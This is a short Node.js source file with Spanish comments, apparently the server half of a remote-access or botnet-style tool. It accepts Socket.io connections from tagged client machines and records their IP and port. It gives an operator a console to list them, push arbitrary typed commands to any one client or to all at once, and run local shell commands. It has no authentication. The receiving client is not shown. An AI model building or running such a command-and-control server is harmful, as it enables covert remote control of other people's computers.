const express = require('express');
const socket = require('socket.io');
const shell = require('shelljs');
const readline = require('readline');
// const chalk = require('chalk'); Color para la consola, para linux.

var app = express();
var server = app.listen(3001);
var io = socket(server);

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

var clients = [];

io.sockets.on('connection', newConnection);

function newConnection(socket){
    //console.log("New connection " + socket.id);

    socket.on('identifier', function(identifier){
        if(!find(identifier.tag)){
            socket.tag = identifier.tag;
            socket.ip = socket.request.connection.remoteAddress; // Obtenemos el ip.
            // En windows retorna ::ffff:IP, quitaremos el ::ffff: luego si deseamos.
            socket.port = socket.request.connection.remotePort; // Obtenemos el puerto.
            clients.push(socket);
        }
    });

    socket.on('disconnect', function() {
        clients.splice(clients.indexOf(socket), 1);
        //console.log("Client has disconnected");
    });

    socket.emit('handshake');
}

function terminal(){
    rl.question('Command: ', function (answer) {
        if (answer == 'exit') return rl.close(); //closing RL and returning from function.

        executeCommand(answer);
        terminal();
    });
}

function executeCommand(command){
    var words = command.split(" ");

    var sendLine = command.split('"');

    if(words[0] == "list"){
        showClients();
    }
    else if(words[0] == "cls"){
        cls();
    }
    else if(words[0] == "send"){ // Ejemplo de comando: send -number- -command-
        sendCommand(words[1], sendLine[1]);
    }
    else if(words[0] == "shell"){
        shell.exec(sendLine[1]);
    }
    else{
        console.log("Command not found");
    }
}

function sendCommand(clientIndex, command){
    console.log("Enviando");
    if(clientIndex == "all"){
        io.sockets.emit('command', command);
    }
    else{
        clients[clientIndex].emit('command', command);
    }
}

function showClients(){
    if(clients.length == 0) {
        console.log("No devices connected");
        return;
    }

    for(var i = 0; i < clients.length; i++){
        console.log(i + ". " + clients[i].tag + " - " + clients[i].ip + " - " + clients[i].port);
    }
}

function find(clientTag){
    for(var i = 0; i < clients.length; i++){
        if(clients[i].tag == clientTag){
            return clients[i].id;
        }
    }
    return false;
}

function cls(){
    console.log('\033c');
}

cls();
terminal();